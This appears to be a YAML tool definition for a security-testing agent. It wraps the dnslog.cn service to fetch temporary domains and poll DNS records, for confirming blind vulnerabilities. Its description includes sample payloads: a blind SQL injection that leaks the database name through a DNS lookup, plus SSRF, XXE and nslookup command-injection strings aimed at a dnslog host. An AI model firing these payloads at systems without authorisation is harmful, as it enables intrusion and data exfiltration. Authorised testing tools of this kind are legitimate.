name: "dnslog"
command: "python3"
args:
  - "-c"
  - |
    import sys
    import requests
    import json
    import time
    import os
    import tempfile

    if len(sys.argv) < 2:
        sys.stderr.write("Error: missing operation type argument (get_domain or get_records)\n")
        sys.exit(1)

    operation = sys.argv[1]
    base_url = "http://dnslog.cn"

    # Use a temporary file to store the cookie
    cookie_file = os.path.join(tempfile.gettempdir(), "dnslog_cookie.txt")

    # Create a session to preserve the cookie
    session = requests.Session()

    # Load the cookie if the cookie file exists
    try:
        if os.path.exists(cookie_file):
            with open(cookie_file, 'r') as f:
                for line in f:
                    if 'PHPSESSID' in line:
                        session.cookies.set('PHPSESSID', line.strip().split('=')[1])
    except:
        pass

    try:
        if operation == "get_domain":
            # Obtain a temporary domain (this also sets the cookie)
            response = session.get(f"{base_url}/getdomain.php", timeout=10)
            response.raise_for_status()
            domain = response.text.strip().rstrip('%')

            # Save the cookie to the file
            try:
                with open(cookie_file, 'w') as f:
                    for cookie in session.cookies:
                        f.write(f"{cookie.name}={cookie.value}\n")
            except:
                pass

            if domain:
                result = {
                    "status": "success",
                    "domain": domain,
                    "message": f"Successfully obtained temporary domain: {domain}",
                    "usage": f"Use this domain for DNS query testing, for example: nslookup {domain} or ping http://{domain}",
                    "note": "The domain is valid for 24 hours; query its records promptly"
                }
                print(json.dumps(result, ensure_ascii=False, indent=2))
            else:
                print(json.dumps({
                    "status": "error",
                    "message": "Failed to obtain a domain; try again later"
                }, ensure_ascii=False, indent=2))
                sys.exit(1)

        elif operation == "get_records":
            # Obtain DNS query records
            if len(sys.argv) < 3:
                sys.stderr.write("Error: the get_records operation requires a domain argument\n")
                sys.exit(1)

            domain = sys.argv[2]
            wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0

            # Wait first if a wait time was specified
            if wait_time > 0:
                print(f"Waiting {wait_time} seconds before querying records...", file=sys.stderr)
                time.sleep(wait_time)

            # Load the cookie if it exists
            try:
                if os.path.exists(cookie_file):
                    with open(cookie_file, 'r') as f:
                        for line in f:
                            if 'PHPSESSID' in line:
                                session.cookies.set('PHPSESSID', line.strip().split('=')[1])
            except:
                pass

            response = session.get(f"{base_url}/getrecords.php", params={"t": domain}, timeout=10)
            response.raise_for_status()
            records_text = response.text.strip().rstrip('%')

            if records_text and records_text != "[]" and records_text.strip():
                # Try to parse the response as JSON if it is JSON-formatted
                try:
                    records = json.loads(records_text)
                    if isinstance(records, list) and len(records) > 0:
                        result = {
                            "status": "success",
                            "domain": domain,
                            "record_count": len(records),
                            "records": records,
                            "message": f"Found {len(records)} DNS query records"
                        }
                        print(json.dumps(result, ensure_ascii=False, indent=2))
                    else:
                        result = {
                            "status": "no_records",
                            "domain": domain,
                            "records": [],
                            "message": "No DNS query records are available yet; the target may not have triggered a DNS query"
                        }
                        print(json.dumps(result, ensure_ascii=False, indent=2))
                except json.JSONDecodeError:
                    # If the response is not JSON, split it into lines
                    records = [line.strip() for line in records_text.split("\n") if line.strip() and line.strip() != "[]"]
                    if records:
                        result = {
                            "status": "success",
                            "domain": domain,
                            "record_count": len(records),
                            "records": records,
                            "message": f"Found {len(records)} DNS query records"
                        }
                        print(json.dumps(result, ensure_ascii=False, indent=2))
                    else:
                        result = {
                            "status": "no_records",
                            "domain": domain,
                            "records": [],
                            "message": "No DNS query records are available yet"
                        }
                        print(json.dumps(result, ensure_ascii=False, indent=2))
            else:
                result = {
                    "status": "no_records",
                    "domain": domain,
                    "records": [],
                    "message": "No DNS query records are available yet; the target may not have triggered a DNS query"
                }
                print(json.dumps(result, ensure_ascii=False, indent=2))

        else:
            sys.stderr.write(f"Error: unknown operation type '{operation}'; supported operations: get_domain, get_records\n")
            sys.exit(1)

    except requests.RequestException as e:
        error_result = {
            "status": "error",
            "message": f"Request failed: {str(e)}",
            "suggestion": "Check the network connection or try again later"
        }
        print(json.dumps(error_result, ensure_ascii=False, indent=2))
        sys.exit(1)
    except Exception as e:
        error_result = {
            "status": "error",
            "message": f"Execution error: {str(e)}"
        }
        print(json.dumps(error_result, ensure_ascii=False, indent=2))
        sys.exit(1)
enabled: true
short_description: "DNSlog tool for validating blind injection, SSRF, XXE, and other non-reflective vulnerabilities"
description: |
  DNSlog is a DNS query-record tool implemented through the dnslog.cn service. It is primarily used to validate non-reflective vulnerabilities such as blind injection, SSRF, XXE, and command injection.

  **Main features:**
  - Obtain a temporary domain: generate a unique temporary domain for DNS query testing
  - Query DNS records: check whether DNS queries have reached that domain
  - Wait-time support: wait for a specified period before querying, for asynchronous vulnerability validation

  **Use cases:**
  - **Blind SQL injection testing**: use a DNS query in an SQL injection payload to confirm successful injection
    - Example: `SELECT LOAD_FILE(CONCAT('\\',(SELECT database()),'.xxx.dnslog.cn\abc'))`
  - **SSRF vulnerability validation**: use a DNS query to confirm the presence of SSRF
    - Example: `http://target.com/api?url=http://xxx.dnslog.cn`
  - **XXE vulnerability validation**: trigger a DNS query through an external entity reference
    - Example: `<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
  - **Command injection testing**: use a DNS query in a command-injection payload
    - Example: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
  - **Non-reflective vulnerability validation**: any situation requiring confirmation that the target performed a specific operation

  **Workflow:**
  1. Use `operation=get_domain` to obtain a temporary domain (for example, `abc123.dnslog.cn`)
  2. Use that domain in the vulnerability-testing payload
  3. Use `operation=get_records` to query for DNS records
  4. If records are present, the vulnerability exists and the payload was executed

  **Notes:**
  - Temporary domains are valid for 24 hours
  - DNS queries may be delayed; wait a few seconds before querying the records
  - This tool depends on the dnslog.cn service and requires network connectivity
  - The tool manages cookie sessions automatically so that domain acquisition and record queries use the same session
parameters:
  - name: "operation"
    type: "string"
    description: |
      Operation type; two operations are supported:
      - `get_domain`: obtain a temporary domain
      - `get_records`: query DNS records
    required: true
    position: 0
    format: "positional"
  - name: "domain"
    type: "string"
    description: |
      Domain argument (used only by the get_records operation).

      This parameter is required when operation is get_records and must contain the previously obtained temporary domain.
    required: false
    position: 1
    format: "positional"
  - name: "wait_time"
    type: "int"
    description: |
      Wait time in seconds (used only by the get_records operation).

      Number of seconds to wait before querying DNS records, giving the target system enough time to perform the DNS query.
      Recommended value: 3-10 seconds, adjusted for network latency and vulnerability type.
    required: false
    position: 2
    format: "positional"
    default: 0
